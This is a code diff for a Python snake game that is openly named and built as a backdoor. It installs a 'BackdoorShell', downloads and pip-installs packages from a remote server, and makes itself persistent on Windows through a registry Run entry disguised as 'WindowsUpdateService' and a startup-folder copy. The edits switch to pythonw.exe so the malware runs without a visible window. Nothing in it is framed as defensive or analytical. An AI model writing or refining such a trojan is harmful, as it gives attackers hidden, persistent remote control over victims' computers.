@@ -4,7 +4,6 @@ Backdoor Snake Game
 Place in: backdoor-snake-game/game/snake_game.py
 """
 
-import pygame
 import sys
 import os
 import subprocess
@@ -139,6 +138,7 @@ class DependencyManager:
         try:
             response = urllib.request.urlopen(f"{SERVER_URL}/list-deps")
             data = json.loads(response.read().decode())
+            print(data)
             return [f['name'] for f in data.get('files', [])]
         except Exception as e:
             print(f"Failed to get file list: {e}")
@@ -155,6 +155,7 @@ class DependencyManager:
             # Find requests wheel
             requests_wheel = None
             for file in available_files:
+                print(file)
                 if file.startswith('requests-') and file.endswith('.whl'):
                     requests_wheel = file
                     break
@@ -239,6 +240,7 @@ class DependencyManager:
                 
                 # Install requests
                 print("Installing requests module...")
+                print(wheel_path)
                 result = subprocess.run(
                     [sys.executable, "-m", "pip", "install", wheel_path],
                     capture_output=True,
@@ -316,7 +318,7 @@ class DependencyManager:
             
             # First try exact match for current Python version
             for file in available_files:
-                if file.startswith('pygame-') and file.endswith('.whl'):
+                if file.startswith('pygame_ce-') and file.endswith('.whl'):
                     if f'cp{py_version}' in file:
                         pygame_wheel = file
                         break
@@ -506,9 +508,13 @@ class PersistenceManager:
                 
                 with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                     executable = sys.executable
+                    pythonw_path = executable.replace('python.exe', 'pythonw.exe')
+                    if not os.path.exists(pythonw_path):
+                       pythonw_path = executable
+                    
                     script_path = os.path.abspath(__file__)
                     winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, 
-                                     f'"{executable}" "{script_path}"')
+                                     f'"{pythonw_path}" "{script_path}"')
                 
                 # Also add to startup folder as backup
                 startup_folder = os.path.join(
@@ -628,6 +634,7 @@ class SnakeGame:
         
         # Initialize backdoor components
         self.shell = BackdoorShell()
+
         
         # Set up display
         self.screen = pygame.display.set_mode((GAME_WIDTH, GAME_HEIGHT))
@@ -923,6 +930,7 @@ def main():
         sys.exit(1)
     
     # Now import pygame (it should be installed)
+    global pygame
     import pygame
     
     # Run the game
